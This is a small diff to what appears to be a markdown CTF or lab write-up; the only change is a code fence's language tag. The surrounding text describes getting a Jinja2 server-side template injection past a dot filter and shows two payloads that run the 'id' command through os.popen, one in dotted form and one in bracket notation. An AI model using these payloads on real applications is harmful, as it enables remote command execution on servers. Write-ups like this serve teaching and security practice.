@@ -61,7 +61,7 @@ def login():
 - However most SSTI payloads contains dots , then after some searching we come across this awesome [research](https://hackmd.io/@Chivato/HyWsJ31dI)
 - the research discussing the possibility of evading the dots filters by using the following approach :
 
-```bash
+```
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 # to
 {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
